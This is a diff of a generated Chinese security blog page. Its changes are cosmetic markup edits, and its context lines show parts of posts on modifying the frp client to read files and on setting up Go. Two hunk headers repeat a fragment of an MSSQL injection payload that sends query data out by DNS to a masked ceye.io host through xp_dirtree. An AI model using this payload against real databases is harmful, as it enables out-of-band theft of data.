@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
@@ -18,7 +18,7 @@
 <meta property="og:title" content="WLSMILE Blog">
 <meta property="og:url" content="http://klforever.cn/index.html">
 <meta property="og:site_name" content="WLSMILE Blog">
-<meta property="og:locale" content="en">
+<meta property="og:locale" content="cn">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WLSMILE Blog">
   
@@ -43,7 +43,7 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script>
+ 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
   
 
@@ -53,7 +53,7 @@
 </head>
 
 <body>
-  <div id="container" q-class="show:isCtnShow">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
     <div class="left-col" q-class="show:isShow">
       
@@ -659,9 +659,9 @@ rootCmd.PersistentFlags().StringVarP(&amp;port, &quot;server_port&quot;, &quot;p
 <p>最后需要在 runClient()函数下调用我们自定义的函数getFileContent()<br><img src="/images/13/8.png" alt></p>
 <p>注意一下参数的接收和代码的注释。</p>
 <h2 id="Go环境搭建编译frp"><a href="#Go环境搭建编译frp" class="headerlink" title="Go环境搭建编译frp"></a>Go环境搭建编译frp</h2><p>这里学弟搞得一键搭建QAQ，不过注意要在 /root/ 目录下运行该脚本</p>
-<pre><code class="sh">go_tar_gz=&quot;go1.15.5.linux-amd64.tar.gz&quot;
+<pre class=" language-sh"><code class="language-sh">go_tar_gz="go1.15.5.linux-amd64.tar.gz"
 
-go_url=&quot;https://dl.google.com/go/${go_tar_gz}&quot;
+go_url="https://dl.google.com/go/${go_tar_gz}"
 
 wget --no-check-certificate -O ${go_tar_gz}  ${go_url}
 tar -xvf  ${go_tar_gz}
@@ -670,7 +670,7 @@ rm  ${go_tar_gz}
 
 # go语言 添加环境变量
 
-cat &lt;&lt;EOF &gt;&gt; ~/.profile
+cat <<EOF >> ~/.profile
 export GOROOT=/root/go
 export GOPATH=/root/go/work
 export PATH=$PATH:/root/go/bin
@@ -685,14 +685,14 @@ mkdir -p /root/go/work
 mkdir -p ~/helloworld
 cd ~/helloworld
 
-cat &lt;&lt;EOF &gt; helloworld.go
+cat <<EOF > helloworld.go
 
 // Test that we can do page 1 of the C book.
 
 package main
 
 func main() {
-    print(&quot;hello, world\n&quot;)
+    print("hello, world\n")
 }
 EOF
 
@@ -2126,11 +2126,11 @@ bases)%2b&#39;.*****.ceye.io\abc&#39;;exec master..xp_dirtree @a;
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -2365,7 +2365,7 @@ bases)%2b&#39;.*****.ceye.io\abc&#39;;exec master..xp_dirtree @a;
 </script>
 
   
-  <!-- <script async type="text/javascript" size="90" alpha="0.2" zIndex="0" src="/plugins/ribbon.js/ribbon.min.js"></script> -->
+  <!-- <script async type="text/javascript" size="90" alpha="0.2" zIndex="0" src="/plugins/ribbon.js/ribbon.min.js"></script> --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
   
   
